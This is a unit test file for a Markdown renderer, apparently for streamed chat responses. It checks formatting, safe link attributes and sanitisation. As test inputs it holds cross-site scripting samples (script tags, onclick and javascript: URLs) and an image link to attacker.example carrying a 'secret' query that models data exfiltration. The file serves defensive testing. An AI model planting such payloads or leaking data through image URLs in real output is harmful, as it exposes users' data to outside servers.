// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { renderMarkdown } from './markdown';

describe('renderMarkdown', () => {
	it('renders common Markdown', () => {
		const html = renderMarkdown(
			'# Title\n\n**bold** and `code`\n\n- one\n- two\n\n```ts\nconst x = 1;\n```'
		);

		expect(html).toContain('<h1>Title</h1>');
		expect(html).toContain('<strong>bold</strong>');
		expect(html).toContain('<code>code</code>');
		expect(html).toContain('<li>one</li>');
		expect(html).toContain('<code class="language-ts">const x = 1;\n</code>');
	});

	it('renders GFM tables and single line breaks', () => {
		expect(renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |')).toContain('<td>1</td>');
		expect(renderMarkdown('line one\nline two')).toContain('line one<br>line two');
	});

	it('opens links in a new tab without opener or referrer', () => {
		const html = renderMarkdown('[docs](https://example.com)');
		expect(html).toContain('href="https://example.com"');
		expect(html).toContain('target="_blank"');
		expect(html).toContain('rel="noopener noreferrer nofollow"');
	});

	it('removes scripts, event handlers and javascript: URLs', () => {
		const html = renderMarkdown(
			'<script>alert(1)</script><a href="javascript:alert(2)">x</a><p onclick="alert(3)">y</p>\n\n[z](javascript:alert(4))'
		);

		expect(html).not.toMatch(/<script|onclick/i);
		expect(html).not.toMatch(/href="javascript:/i);
		expect(html).toContain('<p>y</p>');
	});

	it('never loads images, so they cannot leak data to remote servers', () => {
		const html = renderMarkdown(
			'![chart](https://attacker.example/c.png?q=secret) <img src="https://attacker.example/x.png">'
		);

		expect(html).not.toContain('<img');
		expect(html).toContain('href="https://attacker.example/c.png?q=secret"');
		expect(html).toContain('🖼 chart');
	});

	it('handles incomplete Markdown while a response is still streaming', () => {
		expect(() => renderMarkdown('Here is code:\n\n```py\nprint(')).not.toThrow();
		expect(renderMarkdown('**unfinished')).toContain('**unfinished');
	});
});
